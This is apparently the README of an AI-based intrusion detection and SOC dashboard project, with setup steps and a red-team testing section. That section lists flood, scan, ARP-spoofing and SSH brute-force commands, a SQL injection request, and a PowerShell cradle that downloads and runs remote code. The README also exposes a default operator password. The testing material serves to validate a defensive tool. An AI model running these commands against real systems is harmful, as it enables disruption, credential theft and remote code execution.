# 🛡️ AI-Based Intrusion Detection System (AI-IDS) & Security Operations Center (SOC)

[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/)
[![Framework](https://img.shields.io/badge/framework-FastAPI-009688.svg)](https://fastapi.tiangolo.com/)
[![ML Model](https://img.shields.io/badge/ML%20Engine-XG%20Boost-orange.svg)](https://scikit-learn.org/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

An enterprise-grade, real-time **AI-Powered Intrusion Detection System (IDS)** and **Security Operations Center (SOC) Dashboard**. Featuring deep packet inspection (DPI), machine learning classification, automated SOAR playbooks, multi-channel alert notifications, proactive EDR threat hunting, and an executive report generation engine.

---

## 🌟 Key Features

* **🤖 Machine Learning Threat Classification**: Classifies live network traffic in real-time into 7 attack categories (`BENIGN`, `DOS`, `DDOS`, `RECON`, `BRUTEFORCE`, `WEB`, `MALWARE`, `MITM`).
* **📡 Real-Time Deep Packet Inspection (DPI)**: Scapy & eBPF kernel probes capture network telemetry (Payload Entropy, Special Character Density, SYN/PSH ratios, Per-IP MAC mappings).
* **⚡ Automated SOAR Playbook Engine**: Automatically executes mitigation playbooks (IP isolation, firewall rule deployment, process containment) with sub-second execution speeds.
* **📬 Multi-Channel Incident Alerting**: Dispatches instant high-priority alerts via **Email (SMTP)** and **Telegram Bot**.
* **📊 Executive Business Intelligence & PDF Reports**: Calculates Mean Time to Respond (MTTR), SLA compliance, ROI analyst hours saved, and exports enterprise-grade PDF Threat Intelligence reports.
* **🕵️ Proactive EDR Threat Hunting & Velociraptor DFIR**: Bundled Velociraptor digital forensics engine for process creation tracking, memory artifact auditing, fileless PowerShell injection detection, and proactive threat hunting.
* **🧩 Semantic IaC Auto-Patcher**: Uses local LLM (Ollama/Llama3) to parse Cloud Security (Checkov/OPA) alerts and auto-route them to remediation playbooks.

---

## 🏗️ System Architecture

```
                       ┌─────────────────────────┐
                       │  Live Network Traffic   │
                       └────────────┬────────────┘
                                    │
                         ┌──────────┴──────────┐
                         │  Scapy DPI Sniffer  │
                         └──────────┬──────────┘
                                    │
                 ┌──────────────────┴──────────────────┐
                 ▼                                     ▼
     ┌───────────────────────┐             ┌───────────────────────┐
     │ ML Feature Extraction │             │   Heuristic Signals   │
     │  & Scaler Transform   │             │ (Entropy/Special-Char)│
     └──────────┬────────────┘             └──────────┬────────────┘
                │                                     │
                └──────────────────┬──────────────────┘
                                   │
                         ┌─────────┴─────────┐
                         │  FastAPI Engine   │
                         └─────────┬─────────┘
                                   │
         ┌─────────────────────────┼─────────────────────────┐
         ▼                         ▼                         ▼
┌──────────────────┐     ┌───────────────────┐     ┌──────────────────┐
│  SQLite Archive  │     │   SOAR Engine     │     │ Web Dashboard UI │
│   & Analytics    │     │ & Auto-Mitigation │     │  (WebSocket)     │
└──────────────────┘     └─────────┬─────────┘     └──────────────────┘
                                   │
                         ┌─────────┴─────────┐
                         │ Notification Gateway│
                         │(Email / Telegram) │
                         └───────────────────┘
```

---

## 📋 Prerequisites

Before installing, ensure you have the following installed on your system:

1. **Python 3.10 or higher**: [Download Python](https://www.python.org/downloads/)
2. **Npcap Driver (Required for Windows Users)**: [Download Npcap](https://npcap.com/#download)  
   * **Why Npcap is required:** Scapy is a Python analysis library running in user space — it cannot capture raw hardware packet signals directly on Windows. Npcap is a kernel-level driver (`.sys`) that hooks directly into your physical Wi-Fi/Ethernet network adapter to capture raw packets and pass them to Scapy. *(Make sure to check "Install Npcap in WinPcap API-compatible Mode" during setup)*.  
   * *(Note: Linux users do not need Npcap as Linux OS includes native kernel raw socket support).*
3. **Git**: [Download Git](https://git-scm.com/)
4. *(Optional)* **Ollama with `llama3:8b`** (For local AI Copilot & Semantic IaC auto-patching): [Download Ollama](https://ollama.com/)

---

## 🚀 Installation & Setup

### Step 1: Clone the Repository
Open your terminal / command prompt and clone the repository:
```bash
git clone https://github.com/your-username/AI_Based_IDS.git
cd AI_Based_IDS/ai_ids_project
```

### Step 2: Create a Virtual Environment
Create and activate an isolated Python virtual environment:

* **Windows (CMD / PowerShell)**:
  ```cmd
  python -m venv .venv
  .venv\Scripts\activate
  ```
* **Linux / macOS**:
  ```bash
  python3 -m venv .venv
  source .venv/bin/activate
  ```

### Step 3: Install Required Dependencies
Install the required packages using `requirements.txt`:

* **Windows / Virtual Environment**:
  ```bash
  pip install -r requirements.txt
  ```
* **Linux (Ubuntu 22.04 / 24.04 / Debian / Kali)**:
  ```bash
  sudo pip3 install --break-system-packages -r requirements.txt
  ```

---

### Step 4: Configure Environment Variables (`.env`)
Create a `.env` configuration file in the project root directory (`ai_ids_project/.env`). 

> 💡 **Note for Users**: You can set **any custom username, password, or API key you want** in your `.env` file! The Python backend will automatically read your credentials when starting up.

Copy the `.env.example` template to `.env` or paste the following template:

```env
# Dashboard Authentication Credentials (Set your own custom username & password)
SOC_DASHBOARD_USER=admin
SOC_DASHBOARD_PASSWORD=your_strong_password_here
SOC_ADMIN_API_KEY=your_secure_admin_api_key_here

# Engine Configuration
SOC_BLOCKING_THRESHOLD=75.0
SOC_EXCLUDED_IPS=127.0.0.1,192.168.1.1

# Notification Configuration (Email & Telegram)
ENABLE_EMAIL=true
ENABLE_TELEGRAM=true
NOTIFICATION_COOLDOWN_SEC=300

# Email (SMTP) Credentials
SMTP_SERVER=smtp.gmail.com
SMTP_PORT=587
SENDER_EMAIL=your_email@gmail.com
SENDER_PASSWORD=your_app_password
RECEIVER_EMAIL=admin_email@gmail.com

# Telegram Bot Credentials
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_telegram_chat_id_here

# Local AI LLM (Optional)
SOC_OLLAMA_URL=http://127.0.0.1:11434
SOC_OLLAMA_MODEL=llama3:8b
```

### Step 5: Run Automated Setup for External Security Tools
Run the automated installer script to download and configure official Elasticsearch and Velociraptor binaries:

```bash
python3 setup_tools.py
```

---

## 🖥️ Running the Application

Start the AI-IDS backend server and live web dashboard:

*Linux Launch (Requires root privileges for raw socket sniffing / eBPF kernel mode):*
```bash
# Option 1: System-wide launch
sudo python3 main.py

# Option 2: Virtual Environment launch
sudo ./.venv/bin/python main.py
```

*PowerShell Environment Loading & Launch (Windows):*
```powershell
cd D:\AI_Based_IDS\ai_ids_project
Get-Content .env | Where-Object { $_ -notmatch '^#' -and $_ -match '=' } | ForEach-Object {
    $k,$v = $_ -split '=',2
    [System.Environment]::SetEnvironmentVariable($k.Trim(), $v.Trim(), 'Process')
}
python main.py
```

*or using Uvicorn directly:*
```bash
uvicorn main:app --host 0.0.0.0 --port 8080
```

### Accessing the Web Dashboard
1. Open your web browser and navigate to: **`http://127.0.0.1:8080/dashboard`**
2. **Login Credentials**:
   * **Operator ID**: `Jithendra` *(or your `SOC_DASHBOARD_USER` from `.env`)*
   * **Access Key**: `Jithendra@SOC2026` *(or your `SOC_DASHBOARD_PASSWORD` from `.env`)*

---

### 🦖 Velociraptor EDR & Digital Forensics (DFIR) Server Setup

Velociraptor is pre-configured for host-level process telemetry, digital forensics, and incident response (DFIR) artifact collection.

1. **Navigate to the `velociraptor` directory**:
   ```cmd
   cd velociraptor
   ```
2. **Launch Velociraptor Server with GUI Console**:
   ```cmd
   .\velociraptor.exe gui
   ```
3. **Access the Velociraptor Forensic Management Console**:
   * **URL**: **`https://localhost:8889`**

#### 🔬 How to Collect & Use Velociraptor Forensic Artifacts (VQL):

1. **Open Client / Host Search**:
   * In the GUI (`https://localhost:8889`), click **Host Search** or select your active Endpoint Agent.
2. **Collect New Artifacts**:
   * Click **`+ Collect Artifacts`** in the top menu bar.
3. **Select Key Forensic VQL Artifacts**:
   * **`Windows.System.Pslist`**: Collects running process trees, parent-child process chains, and command lines.
   * **`Windows.Network.Netstat`**: Identifies active TCP/UDP socket connections, remote IP endpoints, and listening ports.
   * **`Windows.Sys.EventLogs`**: Analyzes Security Event Logs (Event ID 4624/4625 for login success/failure).
   * **`Windows.Detection.Psexec`**: Detects unauthorized remote execution and lateral movement.
4. **Configure & Launch Artifact Collection**:
   * Click **Configure Parameters** $\rightarrow$ **Launch Hunt**.
5. **View Results & Integrate with AI SOC**:
   * Inspect collected process memory maps, open network sockets, and suspicious parent process spawns in the **Results** tab.
   * Collected EDR telemetry events stream directly to the AI SOC `/api/edr/log` endpoint, populating the **Proactive Threat Hunting** panel on your dashboard and triggering automated SOAR containment playbooks.

---

### 🔍 Elasticsearch Log Indexing Server Setup

Elasticsearch provides enterprise log indexing and search capabilities for SOC threat intelligence.

1. **Navigate to the `elasticsearch/bin` directory**:
   ```cmd
   cd elasticsearch\bin
   ```
2. **Launch Elasticsearch Engine**:
   ```cmd
   elasticsearch.bat
   ```
3. **Verify Connection**:
   * Open **`http://localhost:9200`** in your browser (AI-IDS automatically dual-writes to port 9200 when active).

---

## 🧪 Testing & Red-Team Attack Simulation

The project includes built-in test tools and supports standard security penetration testing utilities.

### Method 1: Real-World Live Attack Commands (Tested & Validated)

Run these security tools from Kali Linux or an Ubuntu VM against the target IDS host (`<TARGET_IP>`):

#### 💥 DoS & DDoS (ICMP Volumetric Floods)
```bash
sudo hping3 --icmp --flood <TARGET_IP> 
sudo hping3 --icmp --flood --rand-source -d 120 -p 8000 <TARGET_IP>
```

#### 🔍 RECON (Port Scans & Fan-Out Probes)
```bash
sudo hping3 --scan 7900-8020 -S <TARGET_IP>
sudo nmap -sV --top-ports 500 -T4 <TARGET_IP>
sudo nmap -sS -p 1-1000 -T4 <TARGET_IP>
```

#### 🕵️ MITM (ARP Poisoning & Spoofing)
```bash
sudo arpspoof -i ens33 -t <TARGET_IP> <GATEWAY_IP>
```

#### 🌐 WEB (Vulnerability Scanning & Web Exploitation)
```bash
nikto -h http://<TARGET_IP>:8080
```

#### 🔐 BRUTEFORCE (SSH Credential Floods)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
```

### Method 2: Interactive Red-Team Attack Simulator (Built-in)
Run the built-in attack simulator script in a separate terminal window:
```bash
python traffic_simulator.py
```
This launches an interactive CLI menu allowing you to launch simulated attacks against the local IDS:
```
 Select an attack vector to launch against the local IDS:
   1. SYN Flood (DoS / DDoS)
   2. Stealth Port Scan (Recon)
   3. Web Application Attack (SQLi / XSS / RCE)
   4. Brute Force Attack (SSH / FTP / Auth)
   5. Man-in-the-Middle (MITM / ARP Spoofing)
   6. Malware C2 Beaconing & Exfiltration
   7. Run ALL Attack Vectors Sequentially
   8. Exit
```

### Method 2: Testing with Nmap
From another machine or a virtual machine (e.g., Kali Linux / Ubuntu), run an Nmap port scan against your host:
```bash
# Stealth SYN Port Scan (Triggers RECON)
sudo nmap -sS -p 1-1000 -T4 <YOUR_HOST_IP>

# Service Version Detection Scan (Triggers BRUTEFORCE / RECON)
sudo nmap -sV --top-ports 500 -T4 <YOUR_HOST_IP>
```

### Method 3: Testing Web Exploit Signatures
Simulate a SQL Injection web application attack using `curl.exe`:
```powershell
curl.exe "http://127.0.0.1:8080/index.php?id=1'%20UNION%20SELECT%201,username,password%20FROM%20users--"
```

### Method 4: Testing EDR Threat Hunting
Simulate a fileless PowerShell download cradle in Windows Command Prompt:
```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/test_cradle')"
```
Then click **`HYPOTHESIS 1: FILELESS INJECTION`** on the SOC Dashboard to perform a proactive hunt.

---

## 📁 Repository Structure

```
ai_ids_project/
├── main.py                        # Core FastAPI Server, ML Pipeline, Sniffer & API Endpoints
├── traffic_simulator.py           # Red-Team Attack Simulation Harness
├── notification_manager.py        # Multi-Channel Alert Manager (Email/Telegram)
├── report_generator.py            # Entrypoint for PDF Threat Intelligence Report Generator
├── report_engine/                 # Report Generation Core Package
│   ├── pdf_builder.py             # ReportLab PDF Flowable Builder & Layout Engine
│   ├── data_collector.py          # Telemetry Data Aggregator
│   ├── charts.py                  # High-Resolution Matplotlib Chart Builder
│   ├── widgets.py                 # Custom Flowable UI Cards & Tables
│   └── ollama_ai.py               # Local Llama LLM AI Executive Summary Generator
├── soar_orchestrator/             # Automated SOAR Playbook Engine & Playbook Library
├── index.html                     # Main Real-Time Cyber SOC Dashboard UI
├── login.html                     # Operator Authentication Login Page
├── iiot_ids_model.pk1             # Trained Machine Learning Model Artifact
├── iiot_ids_scaler.pk1            # Feature Scaler Artifact
├── soc_threat_intelligence.db     # SQLite Persistent Threat Intelligence Archive
└── README.md                      # Project Documentation
```

---

## 🔌 API Endpoint Summary

| Endpoint | Method | Description |
| :--- | :--- | :--- |
| `/` | `GET` | Serves the Operator Login page (`login.html`). |
| `/dashboard` | `GET` | Serves the main SOC Operations Dashboard (`index.html`). |
| `/api/auth/login` | `POST` | Authenticates operator and issues a signed JWT session token. |
| `/api/logs/history` | `GET` | Fetches historical threat logs from SQLite database. |
| `/api/metrics/executive` | `GET` | Returns Executive Business Intelligence metrics (MTTR, SLA, ROI). |
| `/api/report/export` | `GET` | Generates and downloads the full multi-page PDF SOC Threat Report. |
| `/api/alerts/live` | `GET` | Fetches real-time alert feeds. |
| `/api/alerts/clear` | `POST` | Clears live alert buffers and resets SQLite threat database. |
| `/api/soar/playbooks` | `GET` | Retrieves all loaded automated SOAR playbooks. |
| `/api/cloud/iac-log` | `POST` | Semantic LLM router endpoint for IaC Auto-Patcher finding payloads. |

---

## 🔧 Troubleshooting & Tips

* **Permission Denied / Sniffer Warnings on Windows**:  
  Ensure you run Command Prompt / Terminal **As Administrator** so Scapy has raw socket privileges to inspect network interfaces.
* **Npcap Driver Issue**:  
  If Scapy fails to detect interfaces, reinstall Npcap with **WinPcap API Compatibility** enabled.
* **Telegram Notifications Not Arriving**:  
  Verify your Telegram Bot Token and Chat ID in `.env`, and test delivery via the **`Test Alert`** button on the dashboard.
* **Resetting Database Logs**:  
  To start with a clean dashboard, stop the server, delete `soc_threat_intelligence.db`, and restart `main.py`.

---

## 📜 License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
